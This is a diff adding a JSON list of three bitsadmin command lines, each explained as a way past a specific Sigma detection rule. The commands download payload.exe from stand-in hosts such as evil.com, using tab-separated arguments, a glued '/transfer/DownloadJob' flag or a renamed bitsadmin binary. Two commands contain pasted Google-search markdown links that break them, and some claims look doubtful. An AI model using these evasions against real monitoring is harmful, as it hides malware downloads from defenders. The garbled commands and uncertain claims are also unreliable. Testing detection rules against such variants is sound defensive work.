@@ -1,0 +1,14 @@
+[
+  {
+    "output": "bitsadmin.exe\t/transfer\tmyJob\thttp://evil.com/payload.exe\tC:\\temp\\payload.exe",
+    "explanation": "Using tab characters instead of spaces separates the arguments, avoiding the spaced patterns that the sigma rule looks for (/transfer, /create, /addfile) while still invoking bitsadmin to download a file via HTTP. The rule's selection_img matches, but selection_cmd and selection_cli_* conditions fail, so the rule does not trigger."
+  },
+  {
+    "output": "bitsadmin.exe /transfer/DownloadJob /download /priority normal [http://example.com/payload.exe](https://www.google.com/search?q=http://example.com/payload.exe) C:\\Windows\\Tasks\\payload.exe",
+    "explanation": "The detection logic for selection_cmd checks for the exact string ' /transfer ' (with a leading and trailing space). Because bitsadmin.exe handles parameter grouping natively, you can omit the space directly following the flag name (e.g., '/transfer/DownloadJob'), breaking the exact spacing sequence required by the rule while successfully executing the transfer."
+  },
+  {
+    "output": "copy C:\\Windows\\System32\\bitsadmin.exe C:\\Windows\\Tasks\\not_bits.exe && C:\\Windows\\Tasks\\not_bits.exe /transfer MyJob [http://example.com/payload.exe](https://www.google.com/search?q=http://example.com/payload.exe) C:\\Windows\\Tasks\\payload.exe",
+    "explanation": "The rule mandates an 'and' logic between selection_img and the command line parameters. If bitsadmin.exe is copied out of its standard directory, renamed, and executed under a name that does not match '\\bitsadmin.exe', the selection_img check fails depending on whether the log parser extracts the original filename metadata reliably."
+  }
+]
